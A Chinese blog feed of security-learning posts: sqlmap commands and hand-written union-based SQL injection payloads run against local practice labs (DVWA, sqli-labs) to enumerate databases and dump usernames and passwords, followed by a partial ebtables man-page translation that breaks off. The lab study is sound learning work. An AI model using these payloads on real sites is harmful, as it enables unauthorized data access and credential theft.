1,2 --</code></p><p><img src="err3.png" alt="err3"></p><p><br><strong>注：</strong></p><p>1.注释时，<code>--</code> 后面要加一个或多个空格</p><p>2.select 1,2 这种写法只在 MySQL 里比较好使，SQL Server 或者 Oracle 都应该使用 select null,null[…] 这种写法</p><p><em>这样可以简单地测试出是有 SQL 注入漏洞的，下面就可以使用 SQLMAP 这个神器了</em></p><br><h2 id="0x02-使用-SQLMAP-进行测试"><a href="#0x02-使用-SQLMAP-进行测试" class="headerlink" title="0x02 使用 SQLMAP 进行测试"></a>0x02 使用 SQLMAP 进行测试</h2><p>基本使用：<code>sqlmap.py -u &quot;your_url&quot; [options] ------ 不加参数时默认只判断有没有注入点</code></p><br><h3 id="使用-SQLMAP-查看数据库"><a href="#使用-SQLMAP-查看数据库" class="headerlink" title="使用 SQLMAP 查看数据库"></a>使用 SQLMAP 查看数据库</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dbs</p></blockquote><p><img src="dbs.png" alt="dbs"></p><br><h3 id="使用-SQLMAP-查看当前数据库"><a href="#使用-SQLMAP-查看当前数据库" class="headerlink" title="使用 SQLMAP 查看当前数据库"></a>使用 SQLMAP 查看当前数据库</h3><blockquote><p> sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –current-db</p></blockquote><p><img src="currentdb.png" alt="currentdb"></p><br><h3 id="使用-SQLMAP-爆出数据库-dvwa-中的表"><a href="#使用-SQLMAP-爆出数据库-dvwa-中的表" class="headerlink" title="使用 SQLMAP 爆出数据库(dvwa)中的表"></a>使用 SQLMAP 爆出数据库(dvwa)中的表</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –table -D “dvwa”</p></blockquote><p><img src="tables.png" alt="dvwa"></p><br><p><strong>如果 -D 不使用 <code>&quot;</code> 则会报错：</strong></p><p><img src="noquote.png" alt="noquote"></p><br><h3 id="使用-SQLMAP-爆出表-users-的列"><a href="#使用-SQLMAP-爆出表-users-的列" class="headerlink" title="使用 SQLMAP 爆出表(users)的列"></a>使用 SQLMAP 爆出表(users)的列</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –columns -T “users” -D “dvwa”</p></blockquote><p><img src="columns.png" alt="columns"></p><br><h3 id="使用-SQLMAP-破解账户密码值"><a href="#使用-SQLMAP-破解账户密码值" class="headerlink" title="使用 SQLMAP 破解账户密码值"></a>使用 SQLMAP 破解账户密码值</h3><blockquote><p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dump -C “user,password,user_id” -T “users” -D “dvwa”</p></blockquote><p><img src="crack_md5.png" alt="crack_md5"></p><br><p><strong>也可以使用 MD5 网站解密，结果一致</strong></p><p><img src="md5.png" alt="md5"></p><br><h3 id="查看-SQLMAP-保存在本地的-LOG-文件"><a href="#查看-SQLMAP-保存在本地的-LOG-文件" class="headerlink" title="查看 SQLMAP 保存在本地的 LOG 文件"></a>查看 SQLMAP 保存在本地的 LOG 文件</h3><blockquote><p>C:\Users\Admin\AppData\Local\sqlmap\output\127.0.0.1</p></blockquote><p><strong>日志文件会保存执行过的命令，以及自动化产生的 payload 方便学习</strong></p><br><p><img src="log.png" alt="log"></p><br><p><strong>同时也会保存破解的 MD5 为 csv 文件</strong></p><p><img src="csv.png" alt="csv"></p><br><p><strong>注：</strong></p><p>1.<code>-T</code> 和 <code>-D</code> 选项后的值要用双引号的值括起来，单引号会报错。</p><br><p><strong>今天的实验就到这里了~</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言：现在的网络安全措施日益健全，尤其是针对像 SQL 注入这样的常见漏洞也变得越来越不常见，或者难以利用，对新手体验/学习都不是很好；而且网络安全法也日益完善，所以目前来说，我认为使用 DVWA 或者 pikachu 这样的平台来熟悉 OWASP TOP 10 以及相关安全工具的应用，是必要且稳妥的。&lt;/p&gt;
&lt;p&gt;本文主要介绍一些 SQLMAP 的简单应用，由于暂时只是测试低级别的 SQL 注入，所以可以自己写一个有 SQL 注入的页面来进行测试，本文就是基于此的。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL 注入之坑</title>
    <link href="https://pwn4justice.github.io/2019/06/10/SQL-%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9D%91/"/>
    <id>https://pwn4justice.github.io/2019/06/10/SQL-注入之坑/</id>
    <published>2019-06-10T09:27:30.000Z</published>
    <updated>2019-07-06T08:03:46.582Z</updated>
    
    <content type="html"><![CDATA[<p>记录了一些自己在实践 SQL 注入时遇到的问题及解决和思考。</p><a id="more"></a><ol><li><p>对WHERE子句的一些浅要理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语句 `SELECT * FROM users WHERE username=&apos;admin&apos; OR 1=1;` </span><br><span class="line">相当于：`SELECT * FROM users WHERE username=&apos;admin&apos;;` </span><br><span class="line">和`SELECT * FROM users WHERE 1=1;` 结果的集合，</span><br><span class="line">既返回admin的数据又返回其他用户；</span><br><span class="line"></span><br><span class="line">同理：`SELECT * FROM users WHERE username=&apos;admin&apos; AND password=&apos;&apos; OR 1=1;`</span><br><span class="line">相当于 `SELECT * FROM users WHERE username=&apos;admin&apos; AND password=&apos;&apos;;` </span><br><span class="line">与 `SELECT * FROM users WHERE 1=1;` 的结果结合。</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p><code>--+</code> 注释在 MariaDB （5.5.56）命令行中出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;SELECT version()===&gt; 5.5.56</span><br><span class="line">&gt;SELECT * FROM users WHERE username=&apos;admin&apos; OR 1=1 --+;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos; at line 1</span><br></pre></td></tr></table></figure></li><li><p>在注入遇到困难的时候要想到运用 <code>&amp;</code> 操作符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">考虑： SELECT * FROM users WHERE id=1 &amp; 1=1;# 优先级 ： &apos;&amp;&apos; &gt; &apos;=&apos;</span><br><span class="line">1. id=1 &amp; 1 # TRUE 与 1 进行与运算，结果为1</span><br><span class="line">2. 再 1=1， 结果还是1，既TRUE</span><br><span class="line">3. 返回表的所有行</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>关于对3对应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用数值转换后进行‘与’‘或’‘非’’异或‘等运算，然后再进行注入</span><br><span class="line">如，将字符转换为ASCII码，再分别与1，2，4，8... &amp;运算，可以</span><br><span class="line">得到每一位的值，拼接起来就是ASCII码，再从ASCII码反推回字符。</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>不得不面对的系统数据库：information_schema</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;USE information_schema;</span><br><span class="line">&gt;SHOW tables;</span><br><span class="line">... 有 ...</span><br><span class="line">字符集表(CHARACTER_SETS)</span><br><span class="line">引擎表(ENGINES)</span><br><span class="line">事件表(EVENTS)</span><br><span class="line">文件(FILES)</span><br><span class="line">全局变量(GLOBAL_VARIABLES)</span><br><span class="line">模式权限表(SCHEMA_PRIVILEGES)# SCHEMA 我推测就是 所存在的所有数据库名</span><br><span class="line">TABLES  # 重要！存了所有数据库中的所有表的信息</span><br><span class="line">SCHEMATA# 当前存在的所有数据库名及其字符集，数据库名字段为 schema_name</span><br><span class="line">用户权限表(USER_PRIVILEGES)</span><br><span class="line">和一些InnoDB相关的表：以 INNODB_ 开头</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><p>information_schema 的 TABLES 表中的’字段名’的解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt; DESC TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(512)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(64)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(10)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(32)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(255)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(2048)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">21 rows in set (0.00 sec)</span><br><span class="line">其中，</span><br><span class="line">TABLE_SCHEMA --- 当前已经存在的所有数据库名称</span><br><span class="line">TABLE_NAME.  --- 属于数据库&apos;TABLE_SCHEMA&apos;中的所有表的名称</span><br></pre></td></tr></table></figure></li></ol><ol start="7"><li><p>针对6的应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;SELECT table_name</span><br><span class="line">FROM information.tables</span><br><span class="line">WHERE table_schema = &apos;test&apos;;#test数据库里存了用户名/账号表</span><br><span class="line">获得表名</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| users      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ol><ol start="8"><li><p>利用 information_schema 的可用注入一般流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 可以查看有哪些数据库</span><br><span class="line">&gt; SELECT schema_name FROM information_schema.schemata;</span><br><span class="line"></span><br><span class="line">2. 还可以猜数据库存不存在</span><br><span class="line">&gt; SELECT * FROM information_schema.schemata WHERE schema_name = &apos;users&apos;;</span><br><span class="line">//users 数据库存不存在?</span><br><span class="line"></span><br><span class="line">3. 查看/猜某个已存在的数据库中有没有xxx表</span><br><span class="line">&gt; SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;db_name&apos;;</span><br><span class="line">or &gt; SELECT * FROM information_schema.tables WHERE table_name = &apos;xxx&apos;;</span><br><span class="line">or .. AND table_schema = &apos;yyy&apos;;</span><br><span class="line"></span><br><span class="line">4.获取某表的所有列</span><br><span class="line">&gt; SELECT column_name FROM information_schema.columns WHERE table_name = &apos;xxx&apos;;</span><br><span class="line"></span><br><span class="line">5.获取某列内容</span><br><span class="line">&gt; SELECT yyy FROM xxx [WHERE ...];</span><br></pre></td></tr></table></figure></li></ol><ol start="9"><li><p>有关 information_schema 数据库中 COLUMNS 表的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [information_schema]&gt; DESC columns;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">//省略一些信息</span><br><span class="line">| TABLE_SCHEMA             | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(64)         | NO   |     |         |       |</span><br><span class="line">//</span><br><span class="line">| IS_NULLABLE              | varchar(3)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">//</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(3)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(27)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(80)         | NO   |     |         |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">20 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">大体结构为：</span><br><span class="line">+---+-------------------+---------------------+-------------------------+-------+</span><br><span class="line">xxx - 库名(TABLE_SCHEMA) - 该库的表名(TABLE_NAME) - 该表的列名(COLUMN_NAME) - xxx   |</span><br><span class="line">+---+-------------------+---------------------+-------------------------+-------+</span><br></pre></td></tr></table></figure></li></ol><ol start="10"><li><p>我对 ORDER BY 子句的误解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一直以为 ORDER BY + 列名;</span><br><span class="line">实际上，ORDER BY + 列名的序号也是可以的！如，</span><br><span class="line">ORDER BY 1# 表示按第一列排序</span><br><span class="line">ORDER BY 1 DESC # 按第一列降序排列</span><br><span class="line">ORDER BY 1,2 # 先按第一列后按第二列排序</span><br></pre></td></tr></table></figure></li><li><p>关于 group_concat(某列)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分组连接，顾名思义</span><br><span class="line">将分组中的所有该列的内容，用&apos;,&apos;拼接在一起</span><br></pre></td></tr></table></figure></li><li><p>有关数据库权限的测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MariaDB: </span><br><span class="line">&gt; grant all privileges on security.* to &apos;researcher&apos;@&apos;localhost&apos; identified by &apos;123456&apos; with grant option;</span><br><span class="line"></span><br><span class="line">修改 sql-connection/db_creds.inc:</span><br><span class="line">$dbuser=&apos;researcher&apos;</span><br><span class="line">$dbpass=&apos;123456&apos;</span><br><span class="line"></span><br><span class="line">执行</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="line">看是否还能显示出所有的数据库信息</span><br><span class="line"></span><br><span class="line">测试结果</span><br><span class="line">只能显示少数已存在的数据库信息（这些信息都是&apos;researcher&apos;的权限可见的！</span><br><span class="line"></span><br><span class="line">显示的信息对比：</span><br><span class="line">当dbuser=root时，显示</span><br><span class="line">&gt;&gt;&gt; Your Login name:information_schema,Sample,challenges,cloud_data,dvwa,mysql,performance_schema,security,test###显示了所有数据库，是因为root权限太大，也就是控制该网页的管理员权限太大</span><br><span class="line">当dbuser=researcher时，显示</span><br><span class="line">&gt;&gt;&gt; Your Login name:information_schema,security,test</span><br><span class="line"></span><br><span class="line">结论：</span><br><span class="line">显示了所有数据库，是因为root权限太大，也就是控制该网页的管理员权限太大</span><br></pre></td></tr></table></figure></li></ol><ol start="13"><li><p>猜解security数据库中有哪些表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+</span><br><span class="line">输出：</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></li></ol><ol start="14"><li><p>猜解表users中有哪些列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INPUT：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+此时可以看到所有数据库中包含的users表中的字段信息</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Your Login Name:      user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,user_id,username,password</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">可以加强限制来避免这一点：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &apos;security&apos; and table_name=&apos;users&apos; --+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></li></ol><ol start="15"><li><p>得到合法字段名后，开始获取所需要的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">比如获取id=2的用户信息：</span><br><span class="line">INPUT:</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users%20where%20id=2%20--+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:Angelina</span><br><span class="line">Your Password:I-kill-you</span><br></pre></td></tr></table></figure></li></ol><ol start="16"><li><p>来个所有数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INPUT:</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users --+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure><p>注：不只这么多花样，你还可以结合mysql的语法弄出更多花里胡哨的东西。。。</p><p>注2：之所以要使用group_concat是因为网站限制了输出的条目，LIMIT 0,1导致只能输出一条</p></li></ol><ol start="17"><li><p>总结</p><p>要想玩的熟练，必须得非常熟悉 information_schema 的数据库及其表的结构才行。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录了一些自己在实践 SQL 注入时遇到的问题及解决和思考。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ebtables 的 Man Page</title>
    <link href="https://pwn4justice.github.io/2019/05/16/ebtables-%E7%9A%84Man-Page/"/>
    <id>https://pwn4justice.github.io/2019/05/16/ebtables-的Man-Page/</id>
    <published>2019-05-16T09:20:13.000Z</published>
    <updated>2019-07-06T17:03:20.333Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容翻译自 ebtables 的 Man 页</p><a id="more"></a><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-</strong>[<strong>ACDI</strong>] chain rule specification [match extensions] [watcher extensions] target<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-P</strong> chain <strong>ACCEPT</strong> | <strong>DROP</strong> | <strong>RETURN</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-F</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-Z</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-L</strong> [<strong>-Z</strong>] [chain] [ [<strong>–Ln</strong>] | [<strong>–Lx</strong>] ] [<strong>–Lc</strong>] [<strong>–Lmac2</strong>]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-N</strong> chain [<strong>-P ACCEPT</strong> | <strong>DROP</strong> | <strong>RETURN</strong>]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-X</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-E</strong> old-chain-name new-chain-name<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>–init-table</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-commit</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-init</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-save</strong> </p><p>注：-t 如果有，必须第一个写。</p><br><h3 id="表-三张"><a href="#表-三张" class="headerlink" title="表 - 三张"></a>表 - 三张</h3><ul><li>filter - 默认表。<ul><li>内建的链：<strong>INPUT</strong> {帧[在MAC层面上]就是发给网桥的时候[即帧的目的MAC地址就是网桥时]会经过这条链chain } </li><li><strong>OUTPUT</strong> { 适用于本地生成的帧，或者是(b)routed的帧，，，话说routed我知道是路由时IP层下来的，但是brouted是<strong>什么鬼？？</strong>  }</li><li><strong>FORWARD</strong> { 适用于被网桥转发的帧 }</li></ul></li><li>nat - 最常用来改变帧的目的mac地址<ul><li>内建的链：<strong>PREROUTING</strong> { 适用于在帧刚进主机（路由器）的时候 }</li><li><strong>OUTPUT</strong> { for altering locally generated or (b)routed frames before they are bridged }</li><li><strong>POSTROUTING</strong> { 适用于帧马上要离开主机（路由器）的时候 }</li><li>注：PREROUTING and POSTROUTING: it would be more accurate to call them PREFORWARDING and POSTFORWARDING，且你可以使用 -E 选项来将其改名</li></ul></li><li>broute - 经常被用来 make a brouter ???<ul><li>只有一条内建的链：<strong>BROUTING</strong> , 且这个表中的 <strong>DROP</strong> 和 <strong>ACCEPT</strong> 分别表示”让其被路由“和”让其被桥接“</li><li>BROUTING chain 在很早就会被帧拿来做匹配，当然只能运行”流经<strong>转发状态的端口</strong>的帧“来匹配，此处target常用<code>redirect</code></li></ul></li></ul><br><h3 id="CHAINS-若干"><a href="#CHAINS-若干" class="headerlink" title="CHAINS - 若干"></a>CHAINS - 若干</h3><p><strong>理解方式一：</strong></p><p>内核中有三张内嵌有CHAINS的表。三张表按功能划分，每个功能（也就是表）中用该功能相适应的“规则”。每一条规则就是一个chain。</p><p>每一条chain都是一个有特定顺序的“链表”，用来做一次以太网帧的匹配。如果，某个以太网帧匹配到了一条chain，那么就对该帧执行</p><p>这条chain上的 target。如果这个帧没有匹配上这条chain，那么继续匹配下一跳chain，用户可以扩展一条chain（创建chain的第二个</p><p>往后的结点）然后使用 “头结点” chain “head” 的 target 域来连接。</p><p><em>理解方式不重要，解决问题才重要。</em></p><p><strong>理解方式二：</strong> （这个才是正解）</p><p>内核中有三张内嵌有CHAINS的表。三张表按功能划分，每个功能（也就是表）中用该功能相适应的“规则”。每”一类规则“集就是一个chain。</p><p>如INPUT chain，OUTPUT chain 等，每一条 chain 都是有特定顺序的规则，用来依次做以太网帧的匹配。如果，某个以太网帧匹配到了一</p><p>条 chain 中的某一个规则，那么就对该帧执行这条规则上的 target 。如果这个帧没有匹配上这条规则，那么继续匹配改chain中的下一条规则，</p><p>用户可以扩展一条chain（创建一类新的规则集）然后使用内建的规则集（chain）的 target 域来连接。</p><br><p><strong>搞清楚上文的问号部分：什么是 brouter(‘before route’ or ‘bridge route’)，什么是转发状态的端口，什么是redirect，怎么理解broute</strong></p><ul><li>brouter 即 bridge router ，能桥接又能路由的路由器（目前大部分都是这样）</li><li>REDIRECT：会改变目标MAC地址，在BROUTING链里使用时，MAC地址被改为桥端口地址；在nat表的PREROUTING链中使用时，会改为网桥的地址</li><li>broute：即路由或者判断路由还是桥接的过程</li><li>转发状态的接口：被用来进行”端口转发”的网卡接口（interface）</li></ul><br><h3 id="TARGETS"><a href="#TARGETS" class="headerlink" title="TARGETS"></a>TARGETS</h3><p>1.ACCEPT<br>2.DROP - 丢，不通知<br>3.CONTINUE - 必须去匹配下一个规则（rule）<br>4.RETURN - 有点函数返回的意味。停止继续匹配这条 chain 上（采用理解方式二）的规则，转而去匹配从”调用“（通过target域调用）这条chain 的那个 chain 的下一条规则。<br>5.EXTENSION<br>6.jump to a user-defined chain</p><p>注： In the <strong>BROUTING</strong> chain however, the <strong>ACCEPT</strong> and <strong>DROP</strong> target have different meanings.</p><br><h3 id="ebtables-命令的使用及参数说明"><a href="#ebtables-命令的使用及参数说明" class="headerlink" title="ebtables 命令的使用及参数说明"></a>ebtables 命令的使用及参数说明</h3><p>注：一般一次只能输入一条命令，除非 <code>-L</code> 和 <code>-Z</code> 同时使用；或者<code>-N</code> <code>-P</code>同时使用；或者使用了<code>--atomic-file</code></p><p>-D, --delete</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-D start_nr[:end_nr] 或者-D complete-rule，可以使用负数</p><p>-C, --change-counters</p><p>-I, --insert</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-I rule [在某个特定的位置，一般是某一个chain的最开始]插入一条rule，如果现在某个chain已经有了N条规则，那么在 